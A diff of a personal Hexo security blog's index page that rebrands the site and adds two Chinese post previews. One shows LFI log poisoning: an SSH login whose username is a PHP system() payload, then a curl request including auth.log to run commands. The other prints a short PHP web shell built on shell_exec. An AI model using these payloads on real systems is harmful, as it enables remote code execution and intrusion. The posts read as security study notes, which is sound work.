@@ -88,7 +88,7 @@
                 <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 
                     <div class="site-heading">
-                        <h1>Rooclay</h1>
+                        <h1>ROOTCLAY</h1>
                         <!--<hr class="small">-->
                         <span class="subheading">Only when you plant the flowers can you really smell their fragrance.</span>
                     </div>
@@ -113,7 +113,7 @@
                 <span class="icon-bar"></span>
                 <span class="icon-bar"></span>
             </button>
-            <a class="navbar-brand" href="/">Rooclay</a>
+            <a class="navbar-brand" href="/">ROOTCLAY</a>
         </div>
 
         <!-- Collect the nav links, forms, and other content for toggling -->
@@ -213,6 +213,70 @@
 
 <div class="post-preview">
 
+    <a href="/2017/05/01/lfi_ssh/">
+        <h2 class="post-title">
+            Untitled
+        </h2>
+        <h3 class="post-subtitle">
+            
+        </h3>
+        <div class="post-content-preview">
+            LFI SSH日志
+1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
+1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
+Tips:
+123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-05-01
+        </p>
+        <div class="tags">
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
+    <a href="/2017/05/01/linux_doc_shell/">
+        <h2 class="post-title">
+            Untitled
+        </h2>
+        <h3 class="post-subtitle">
+            
+        </h3>
+        <div class="post-content-preview">
+            Linux下短字符写shell
+代码
+123456#!php&lt;?phpif(strlen($_GET[1]) &lt; 8) &#123;  echo shell_exec($_GET[1]);&#125;?&gt;
+背景知识
+1、linux下写文件
+12#!basha&gt;1.txt
+这样就会在本目录下生成一个1.txt文件，内容会有a
+2、linux下本行无法执行完命令时
+123......
+        </div>
+    </a>
+    
+        <p class="post-meta" style="margin: 10px 0;">
+            Posted by Rootclay on
+            2017-05-01
+        </p>
+        <div class="tags">
+            
+        </div>
+    
+
+</div>
+<hr>
+
+<div class="post-preview">
+
     <a href="/2017/03/18/hexo-theme-beantech/">
         <h2 class="post-title">
             [Hexo] Theme BeanTech
@@ -274,33 +338,17 @@ I publish the whole ......
     sidebar-container
 ">
     
-        <!-- Featured Tags -->
-
-<section>
-    <!-- no hr -->
-    <h5><a href="/tags/">FEATURED TAGS</a></h5>
-    <div class="tags">
-        
-            
-        
-            
-        
-    </div>
-</section>
-
-        <hr>
-    
         <!-- Short About -->
 <section class="visible-md visible-lg">
     <h5><a href="/about/">ABOUT ME</a></h5>
     <div class="short-about">
 
         
-            <img id = "avatar_pic" src="/img/ironman-draw.png" />
+            <img id = "avatar_pic" src="/img/wechat.png" />
         
 
         
-            <p>Hi, i&#39;m John Doe</p>
+            <p>Let&#39;s Wechat</p>
         
 
         <!-- SNS Link -->
@@ -318,7 +366,7 @@ I publish the whole ......
             
             
                 <li>
-                    <a target="_blank" href="https://www.zhihu.com/people/people/xiang-shan-74-8">
+                    <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
                         <span class="fa-stack fa-lg">
                             <i class="fa fa-circle fa-stack-2x"></i>
                             <i class="fa  fa-stack-1x fa-inverse">知</i>
@@ -362,6 +410,14 @@ I publish the whole ......
   <h5>RECENT POSTS</h3>
   <div class="widget">
     <ul>
+      
+        <li>
+          <a href="/2017/05/01/lfi_ssh/">(no title)</a>
+        </li>
+      
+        <li>
+          <a href="/2017/05/01/linux_doc_shell/">(no title)</a>
+        </li>
       
         <li>
           <a href="/2017/03/18/hexo-theme-beantech/">[Hexo] Theme BeanTech</a>
@@ -417,7 +473,7 @@ I publish the whole ......
                 
                 
                     <li>
-                        <a target="_blank" href="https://www.zhihu.com/people/people/xiang-shan-74-8">
+                        <a target="_blank" href="https://www.zhihu.com/people/xiang-shan-74-8">
                             <span class="fa-stack fa-lg">
                                 <i class="fa fa-circle fa-stack-2x"></i>
                                 <i class="fa  fa-stack-1x fa-inverse">知</i>
@@ -455,17 +511,6 @@ I publish the whole ......
                 </ul>
                 <p class="copyright text-muted">
                     Copyright &copy; Rootclay 2017 
-                    <br>
-                    Theme by <a href="http://huangxuan.me">Hux</a> 
-                    <span style="display: inline-block; margin: 0 5px;">
-                        <i class="fa fa-heart"></i>
-                    </span> 
-                    re-Ported by <a href="http://beantech.org">BeanTech</a> | 
-                    <iframe
-                        style="margin-left: 2px; margin-bottom:-5px;"
-                        frameborder="0" scrolling="0" width="91px" height="20px"
-                        src="https://ghbtns.com/github-btn.html?user=YenYuHsuan&repo=hexo-theme-beantech&type=star&count=true" >
-                    </iframe>
                 </p>
             </div>
         </div>
